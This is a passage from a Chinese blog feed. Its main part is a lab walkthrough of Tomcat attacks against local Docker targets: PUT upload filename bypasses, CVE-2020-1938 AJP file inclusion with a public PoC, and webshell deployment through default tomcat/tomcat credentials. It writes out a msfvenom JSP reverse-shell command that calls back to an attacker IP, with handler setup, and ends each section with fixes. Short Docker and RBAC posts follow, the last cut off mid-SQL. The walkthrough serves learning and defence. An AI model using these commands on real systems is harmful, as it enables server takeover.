<h2 id="这里就需要进行绕过，这里绕过有三种方法"><a href="#这里就需要进行绕过，这里绕过有三种方法" class="headerlink" title="这里就需要进行绕过，这里绕过有三种方法"></a>这里就需要进行绕过，这里绕过有三种方法</h2><h3 id="Windows下不允许文件以空格结尾以PUT-a001-jsp-20-HTTP-1-1上传到-Windows会被自动去掉末尾空格使用-20绕过。我们知道-20对应的是空格，在windows中若文件这里在jsp后面添加-20即可达到自动抹去空格的效果。这里看到返回201已经上传成功了"><a href="#Windows下不允许文件以空格结尾以PUT-a001-jsp-20-HTTP-1-1上传到-Windows会被自动去掉末尾空格使用-20绕过。我们知道-20对应的是空格，在windows中若文件这里在jsp后面添加-20即可达到自动抹去空格的效果。这里看到返回201已经上传成功了" class="headerlink" title="Windows下不允许文件以空格结尾以PUT &#x2F;a001.jsp%20 HTTP&#x2F;1.1上传到 Windows会被自动去掉末尾空格使用%20绕过。我们知道%20对应的是空格，在windows中若文件这里在jsp后面添加%20即可达到自动抹去空格的效果。这里看到返回201已经上传成功了"></a>Windows下不允许文件以空格结尾以PUT &#x2F;a001.jsp%20 HTTP&#x2F;1.1上传到 Windows会被自动去掉末尾空格使用%20绕过。我们知道%20对应的是空格，在windows中若文件这里在jsp后面添加%20即可达到自动抹去空格的效果。这里看到返回201已经上传成功了</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-1.png"></p>
<h4 id="进入docker查看，上传成功"><a href="#进入docker查看，上传成功" class="headerlink" title="进入docker查看，上传成功"></a>进入docker查看，上传成功</h4><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-2.png"></p>
<h3 id="在jsp后缀后面使用-，因为-在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传-ice1-jsp-，看到返回201"><a href="#在jsp后缀后面使用-，因为-在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传-ice1-jsp-，看到返回201" class="headerlink" title="在jsp后缀后面使用&#x2F;，因为&#x2F;在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传&#x2F;ice1.jsp&#x2F;，看到返回201"></a>在jsp后缀后面使用&#x2F;，因为&#x2F;在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传&#x2F;ice1.jsp&#x2F;，看到返回201</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-3.png"></p>
<h4 id="进入docker查看，上传成功-1"><a href="#进入docker查看，上传成功-1" class="headerlink" title="进入docker查看，上传成功"></a>进入docker查看，上传成功</h4><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-4.png"></p>
<h3 id="使用Windows-NTFS流，在jsp后面添加-DATA，看到返回201，上传成功"><a href="#使用Windows-NTFS流，在jsp后面添加-DATA，看到返回201，上传成功" class="headerlink" title="使用Windows NTFS流，在jsp后面添加::$DATA，看到返回201，上传成功"></a>使用Windows NTFS流，在jsp后面添加::$DATA，看到返回201，上传成功</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-5.png"></p>
<h4 id="进入docker查看，上传成功-2"><a href="#进入docker查看，上传成功-2" class="headerlink" title="进入docker查看，上传成功"></a>进入docker查看，上传成功</h4><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-7-6.png"></p>
<h2 id="使用冰蝎工具进行连接jsp，拿到webshell"><a href="#使用冰蝎工具进行连接jsp，拿到webshell" class="headerlink" title="使用冰蝎工具进行连接jsp，拿到webshell"></a>使用冰蝎工具进行连接jsp，拿到webshell</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-4-8.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">漏洞修复：把<span class="built_in">readonly</span> 改成<span class="literal">true</span></span><br><span class="line">&lt;init-param&gt;</span><br><span class="line"> &lt;param-name&gt;<span class="built_in">readonly</span>&lt;/param-name&gt;</span><br><span class="line"> &lt;param-value&gt;<span class="literal">false</span>&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-1938漏洞"><a href="#CVE-2020-1938漏洞" class="headerlink" title="CVE-2020-1938漏洞"></a>CVE-2020-1938漏洞</h1><blockquote>
<p>漏洞介绍：CVE-2020-1938为Tomcat AJP文件包含漏洞。由长亭科技安全研究员发现的存在于 Tomcat中的安全漏洞，由于 Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取 webapp配置文件或源码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
</blockquote>
<blockquote>
<p>漏洞原理：Tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shelltomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p>
</blockquote>
<blockquote>
<p>此次实验环境靶场:kali2023 192.168.74.130 攻击机器:kali2023 192.168.74.142</p>
</blockquote>
<h2 id="启动CVE-2020-1938的docker环境"><a href="#启动CVE-2020-1938的docker环境" class="headerlink" title="启动CVE-2020-1938的docker环境"></a>启动CVE-2020-1938的docker环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">cd</span>/valhub/tomcat/CVE-2020-1938  <span class="comment">#进入漏洞目录</span></span><br><span class="line">$ <span class="built_in">sudo</span> docker-compose up -d  <span class="comment">#启动环境</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-1-1.png"></p>
<blockquote>
<p>注意：此时启动环境发生错误，原因是我们上次的环境没有关闭，端口被占用了，我们只需关闭上次环境即可解决</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker stop <span class="built_in">id</span>号  <span class="comment">#Docker关闭环境命令</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-1-2.png"></p>
<h2 id="此时攻击机器可访问到靶场，代表靶场搭建成功"><a href="#此时攻击机器可访问到靶场，代表靶场搭建成功" class="headerlink" title="此时攻击机器可访问到靶场，代表靶场搭建成功"></a>此时攻击机器可访问到靶场，代表靶场搭建成功</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-2.png"></p>
<h2 id="首先在攻击机器使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件"><a href="#首先在攻击机器使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件" class="headerlink" title="首先在攻击机器使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件"></a>首先在攻击机器使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git</span><br><span class="line">$ <span class="built_in">cd</span> CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">$ python CNVD-2020-10487-Tomcat-Ajp-lfi.py</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-3.png"></p>
<h2 id="这里查看8009端口下的web-xml文件"><a href="#这里查看8009端口下的web-xml文件" class="headerlink" title="这里查看8009端口下的web.xml文件"></a>这里查看8009端口下的web.xml文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.74.130 -p 8009 -f /WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-1.png"></p>
<blockquote>
<p>注意：此时出现错误，原因是这个错误通常发生在尝试使用Python的socket库创建一个文件对象时，错误地传递了一个不被支持的参数。在Python 3中，socket.makefile()方法已经不再接受’bufsize’参数，这可能是由于脚本是基于旧版本的Python或使用了过时的代码示例</p>
</blockquote>
<blockquote>
<p>我选择的解决方案是：更换python版本为2.x，kali新版默认已经将python2.7和python3装好了，因为有的软件对python版本有要求，因此我下面说一下如何在两个python版本中进行切换（优先级150&gt;100）设置版本优先级（通过update-alternatives命令：其作用是进行软件版本的切换，Linux发行版中均可用此命令）</p>
</blockquote>
<h3 id="首先查看我的python初始版本为3-x"><a href="#首先查看我的python初始版本为3-x" class="headerlink" title="首先查看我的python初始版本为3.x"></a>首先查看我的python初始版本为3.x</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-2.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">ls</span> /usr/bin/python*  <span class="comment">#查看所有的python版本</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-3.png"></p>
<h3 id="设置优先级"><a href="#设置优先级" class="headerlink" title="设置优先级"></a>设置优先级</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> update-alternatives --install /usr/bin/python python /usr/bin/python2 100</span><br><span class="line">$ <span class="built_in">sudo</span> update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-4.png"></p>
<h3 id="查看当前可识别版本"><a href="#查看当前可识别版本" class="headerlink" title="查看当前可识别版本"></a>查看当前可识别版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> update-alternatives --list python</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-5.png"></p>
<h3 id="上面配置完毕之后，接下来就可以切换版本了-根据对应数字输入即可进行切换"><a href="#上面配置完毕之后，接下来就可以切换版本了-根据对应数字输入即可进行切换" class="headerlink" title="上面配置完毕之后，接下来就可以切换版本了(根据对应数字输入即可进行切换)"></a>上面配置完毕之后，接下来就可以切换版本了(根据对应数字输入即可进行切换)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> update-alternatives --config python</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-6.png"></p>
<h3 id="查看此时的版本看是否切换成功"><a href="#查看此时的版本看是否切换成功" class="headerlink" title="查看此时的版本看是否切换成功"></a>查看此时的版本看是否切换成功</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> python --version</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-7.png"></p>
<h3 id="此时我们的版本已经成功切换成2-x，再次查看web-xml文件看是否能够查看"><a href="#此时我们的版本已经成功切换成2-x，再次查看web-xml文件看是否能够查看" class="headerlink" title="此时我们的版本已经成功切换成2.x，再次查看web.xml文件看是否能够查看"></a>此时我们的版本已经成功切换成2.x，再次查看web.xml文件看是否能够查看</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.74.130 -p 8009 -f /WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-8.png"></p>
<blockquote>
<p>此时攻击机器可以成功看到文件，证明确实存在文件包含漏洞</p>
</blockquote>
<h2 id="漏洞利用getshell"><a href="#漏洞利用getshell" class="headerlink" title="漏洞利用getshell"></a>漏洞利用getshell</h2><blockquote>
<p>想要getshell则网站需要有文件上传的地方，这个靶场没有这个功能，不过我们可以模拟一下这个过程，我们手动复制木马文件到靶场服务器来模拟getshell过程</p>
</blockquote>
<blockquote>
<p>注：真实环境中，在攻击器上生成木马，通过漏洞上传过去的，我在这里直接靶机 192.168.74.130上生成，复制到服务器目录中</p>
</blockquote>
<h3 id="Kali生成Java木马文件"><a href="#Kali生成Java木马文件" class="headerlink" title="Kali生成Java木马文件"></a>Kali生成Java木马文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.74.142 LPORT=4444 -f raw &gt; shell.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-1.png"></p>
<h3 id="复制该木马文件到docker容器中复制该木马文件到docker容器中"><a href="#复制该木马文件到docker容器中复制该木马文件到docker容器中" class="headerlink" title="复制该木马文件到docker容器中复制该木马文件到docker容器中"></a>复制该木马文件到docker容器中复制该木马文件到docker容器中</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker <span class="built_in">cp</span> shell.txt facb1f38316c:/usr/local/tomcat/webapps/ROOT/WEB-INF/</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-2.png"></p>
<h3 id="回到攻击机器上"><a href="#回到攻击机器上" class="headerlink" title="回到攻击机器上"></a>回到攻击机器上</h3><blockquote>
<p>通过之前下载的POC访问一下，发现成功读取到了内容，但是我们目的是getshell,需要让反向shell执行才行</p>
</blockquote>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-3.png"></p>
<h3 id="先进入到msfconsole"><a href="#先进入到msfconsole" class="headerlink" title="先进入到msfconsole"></a>先进入到msfconsole</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> use exploit/multi/handler</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">set</span> payload java/jsp_shell_reverse_tcp</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">set</span> lhost 192.168.74.142 <span class="comment">## 攻击器IP</span></span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">set</span> lport 4444  <span class="comment">## 攻击器需要监听的端口（跟生成反向shell时设置的端口一样）</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-4.png"></p>
<blockquote>
<p>开启监听成功</p>
</blockquote>
<h3 id="攻击主机访问木马文件，并编译执行，反向连接我们攻击主机"><a href="#攻击主机访问木马文件，并编译执行，反向连接我们攻击主机" class="headerlink" title="攻击主机访问木马文件，并编译执行，反向连接我们攻击主机"></a>攻击主机访问木马文件，并编译执行，反向连接我们攻击主机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> python2 <span class="string">&#x27;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&#x27;</span> -p 8009 -f /WEB-INF/shell.txt 192.168.74.130</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：这俩文件作用不一样，’Tomcat-ROOT路径下文件包含….’是用来编译执行服务器代码，执行反向shell用的这个，也就是上面一步，让木马执行反向连接我们电脑而Tomcat-ROOT路径下文件读取….’单纯的读取文件内容，而不会编译执行</p>
</blockquote>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-5.png"></p>
<blockquote>
<p>说明服务器上上传的反向木马编译执行了成功拿到shell！</p>
</blockquote>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-6.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">漏洞修复：</span><br><span class="line">1、将 Tomcat立即升级到9.0.31、8.5.51或7.0.100版本进行修复</span><br><span class="line">2、禁用AJP协议</span><br><span class="line">具体方法：</span><br><span class="line">编辑/conf/server.xml，找到如下行：</span><br><span class="line">&lt;Connector port=<span class="string">&quot;8009&quot;</span>protocol=<span class="string">&quot;AJP/1.3&quot;</span> redirectPort=<span class="string">&quot;8443&quot;</span> /&gt;</span><br><span class="line">注释或删除</span><br><span class="line">3、配置 secret来设置AJP协议的认证凭证。</span><br></pre></td></tr></table></figure>
<h1 id="弱口令war远程部署"><a href="#弱口令war远程部署" class="headerlink" title="弱口令war远程部署"></a>弱口令war远程部署</h1><blockquote>
<p>漏洞原理：在tomcat8环境下默认进入后台的密码为tomcat&#x2F;tomcat，未修改造成未授权即可进入后台</p>
</blockquote>
<h2 id="进入tomcat8的docker环境"><a href="#进入tomcat8的docker环境" class="headerlink" title="进入tomcat8的docker环境"></a>进入tomcat8的docker环境</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-1.png"></p>
<h2 id="访问后台管理地址，使用tomcat-tomcat进入后台"><a href="#访问后台管理地址，使用tomcat-tomcat进入后台" class="headerlink" title="访问后台管理地址，使用tomcat&#x2F;tomcat进入后台"></a>访问后台管理地址，使用tomcat&#x2F;tomcat进入后台</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-2.png"></p>
<h2 id="成功进入后台管理界面，看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外"><a href="#成功进入后台管理界面，看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外" class="headerlink" title="成功进入后台管理界面，看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外"></a>成功进入后台管理界面，看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-3.png"></p>
<h2 id="我们将冰蝎生成的jsp文件打包成test-war"><a href="#我们将冰蝎生成的jsp文件打包成test-war" class="headerlink" title="我们将冰蝎生成的jsp文件打包成test.war"></a>我们将冰蝎生成的jsp文件打包成test.war</h2><blockquote>
<p>war包是用来进行Web开发时一个网站项目下的所有代码，包括前台HTML&#x2F;CSS&#x2F;JS代码，以及后台 JavaWeb的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录，当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署</p>
</blockquote>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-4.png"></p>
<h2 id="点击上传即可看到上传的test-war已经部署成功"><a href="#点击上传即可看到上传的test-war已经部署成功" class="headerlink" title="点击上传即可看到上传的test.war已经部署成功"></a>点击上传即可看到上传的test.war已经部署成功</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-5.png"></p>
<h2 id="尝试访问一下没有报错404，那么已经上传成功"><a href="#尝试访问一下没有报错404，那么已经上传成功" class="headerlink" title="尝试访问一下没有报错404，那么已经上传成功"></a>尝试访问一下没有报错404，那么已经上传成功</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-6.png"></p>
<h2 id="使用冰蝎进行连接即可拿到shell"><a href="#使用冰蝎进行连接即可拿到shell" class="headerlink" title="使用冰蝎进行连接即可拿到shell"></a>使用冰蝎进行连接即可拿到shell</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-7.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修复建议：</span><br><span class="line">1、在系统上以低权限运行 Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）</span><br><span class="line">2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。</span><br><span class="line">在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制</span><br><span class="line">3、以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制</span><br></pre></td></tr></table></figure>
<table><tr><td bgcolor=yellow>
至此，所有实验已完成，这是作为小白的一个小小记录，如果有帮助到你，我很开心，大佬勿喷~
当然如果对此文有问题可随时联系我哦~~~
</td></tr></table>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Tomcat</tag>
        <tag>Docker</tag>
        <tag>kali</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker安装nginx</title>
    <url>/2024/03/28/Docker%E5%AE%89%E8%A3%85nginx/</url>
    <content><![CDATA[<h1 id="Docker学习"><a href="#Docker学习" class="headerlink" title="Docker学习"></a>Docker学习</h1><h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><blockquote>
<p>搜索镜像</p>
</blockquote>
<p>可以在docker hub上面搜索nginx</p>
<blockquote>
<p>下载镜像</p>
</blockquote>
<p>docker pull nginx</p>
<blockquote>
<p>运行测试</p>
</blockquote>
<p>-d 后台运行</p>
<p>–name 给容器命名</p>
<p>-p 宿主机端口，容器内部端口</p>
<p>docker run -d –name nginx01 -p 3344:80 nginx</p>
<blockquote>
<p>进入容器</p>
</blockquote>
<p>docker exec -it nginx01 &#x2F;bin&#x2F;bash</p>
<p>whereis nginx</p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>RBAC角色权限模型</title>
    <url>/2024/04/07/RBAC/</url>
    <content><![CDATA[<blockquote>
<p>本次博客记录初步掌握RBAC基于角色权限的模型</p>
</blockquote>
<h1 id="什么是RBAC"><a href="#什么是RBAC" class="headerlink" title="什么是RBAC"></a>什么是RBAC</h1><h2 id="维基百科定义"><a href="#维基百科定义" class="headerlink" title="维基百科定义"></a>维基百科定义</h2><p>在一个组织中，会因为不同的作业功能产生不同的角色，执行某项操作的权限会被赋予特定的角色。组织成员或者工作人员（抑或其它系统用户）则被赋予不同的角色，这些用户通过被赋予角色来获取执行某项计算机系统功能的权限。</p>
<ul>
<li>S &#x3D; 主体 &#x3D; 一名用户或自动代理人</li>
<li>R &#x3D; 角色 &#x3D; 被定义为一个授权等级的工作职位或职称</li>
<li>P &#x3D; 权限 &#x3D; 一种访问资源的方式</li>
<li>SE &#x3D; 会期 &#x3D; S，R或P之间的映射关系</li>
<li>SA &#x3D; 主体指派</li>
<li>PA &#x3D; 权限指派</li>
<li>RH &#x3D; 角色层次结构。能被表示为：≥（x ≥ y 代表 x 继承 y 的权限）</li>
<li>一个主体可对应多个角色。</li>
<li>一个角色可对应多个主体。</li>
<li>一个角色可拥有多个权限。</li>
<li>一种权限可被分配给许多个角色。</li>
<li>一个角色可以有专属于自己的权限。</li>
</ul>
<h2 id="简单来说"><a href="#简单来说" class="headerlink" title="简单来说"></a>简单来说</h2><p>Role-Based Access Control，中文意思是：基于角色（Role）的访问控制。<br>简单来说，就是通过将<font color = red>权限分配给➡角色</font>，再将<font color = red>角色分配给➡用户</font>，来实现对系统资源的访问控制。一个用户拥有若干角色，每一个角色拥有若干权限。这样，就构造成“用户-角色-权限”的授权模型。在这种模型中，用户与角色之间，角色与权限之间，一般者是多对多的关系。具体而言，RBAC模型定义了以下几个核心概念：</p>
<ol>
<li><p>角色（Role）：角色是指在系统中具有一组相关权限的抽象概念，代表了用户在特定上下文中的身份或职能，例如管理员、普通用户等。</p>
</li>
<li><p>权限（Permission）：权限是指对系统资源进行操作的许可，如读取、写入、修改等。权限可以被分配给角色。</p>
</li>
<li><p>用户（User）：用户是指系统的实际使用者，每个用户可以被分配一个或多个角色。</p>
</li>
<li><p>分配（Assignment）：分配是指将角色与用户关联起来，以赋予用户相应的权限。</p>
</li>
</ol>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/RBAC/loginRBAC.png" alt="登录示例图"></p>
<h1 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h1><p>RBAC模型的工作流程如下：</p>
<ol>
<li><p>定义角色：系统管理员根据业务需求定义不同的角色，例如提报人员、审核人员</p>
</li>
<li><p>分配权限：为每个分配角色相应的权限，例如提报人员负责上架商品、审核人员可以审核商品</p>
</li>
<li><p>用户分配：将用户分配到适当的角色</p>
</li>
</ol>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/RBAC/processRBAC.png" alt="流程图"></p>
<h1 id="模型对比"><a href="#模型对比" class="headerlink" title="模型对比"></a>模型对比</h1><p>在传统的权限模型中，我们直接将权限赋予用户，这种方式在小型系统中可能还能应对，但在大型复杂系统中很快就会变得难以管理，不太可能让每个用户都有不同的权限，在管理上太麻烦了。因此RBAC模型的核心思想是引入「角色」的概念，将权限赋予在角色身上，再将角色绑定在用户。</p>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/RBAC/compareRBAC.png" alt="模型对比图"><br>与 RBAC 这种用户角色权限架构和传统的用户权限架构相比，差异是：</p>
<ol>
<li>简化权限管理：通过这个角色中间层，减少权限分配的控管成本，如果要增加操作权限，只要针对指定的「角色」调整，调整后该角色的「用户」都会一起有这个权限。</li>
<li>提高安全性：可以更精确地控制用户的权限，降低权限的风险，比较不会出现某些「用户」的信箱存在非预期的权限。</li>
<li>调整灵活：可以快速调整用户的权限，只需更改用户对应的「角色」就可以套用。</li>
</ol>
<h1 id="模型案例"><a href="#模型案例" class="headerlink" title="模型案例"></a>模型案例</h1><h2 id="仓库管理系统"><a href="#仓库管理系统" class="headerlink" title="仓库管理系统"></a>仓库管理系统</h2><p>在一个大型仓库管理系统中，可能会有以下角色：</p>
<ol>
<li><p>最高管理员：拥有系统的所有权限，包含新增成员</p>
</li>
<li><p>仓库经理：可以查看所有库存数据，包括上架、出货、报表</p>
</li>
<li><p>上架人员：仅负责商品的入库和上架，包含上架商品和修改库存</p>
</li>
<li><p>出货人员：仅负责商品的出库，包含配货号、出货、出货</p>
</li>
<li><p>财务人员：仅负责下载报表，包含业绩报表、库存报表</p>
</li>
<li><p>在这个系统中，如果有一个新员工要成为上架人员，我们只需将他的用户指定到「上架人员」这个角色，他就能获得上架人员的所有权限</p>
</li>
</ol>
<p>如果上架人员要增加一个权限，我们只需针对「上架人员」这个角色增加设定，里面的所有「用户」的账号就能被套用。</p>
<p>若某个用户要改成管理员，也只需调整该帐号对应的「角色」即可。从上架人员改成管理员。</p>
<blockquote>
<p>以下是对应转换成数据库存储的仓库管理系统RBAC的Demo</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建用户表</span></span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `user`;</span><br><span class="line">CREATE TABLE `user`  (</span><br><span class="line">  `<span class="built_in">id</span>` bigint NOT NULL,</span><br><span class="line">  `name` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL,</span><br><span class="line">  `card` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL COMMENT <span class="string">&#x27;工号&#x27;</span>,</span><br><span class="line">  `age` int NULL DEFAULT NULL,</span><br><span class="line">  `gender` tinyint NULL DEFAULT 0 COMMENT <span class="string">&#x27;0男 1女 默认0&#x27;</span>,</span><br><span class="line">  `phone` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`<span class="built_in">id</span>`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入实验数据</span></span><br><span class="line"></span><br><span class="line">INSERT INTO `user` VALUES (1, <span class="string">&#x27;leaderLiu&#x27;</span>, <span class="string">&#x27;888&#x27;</span>, 18, 0, <span class="string">&#x27;110&#x27;</span>);</span><br><span class="line">INSERT INTO `user` 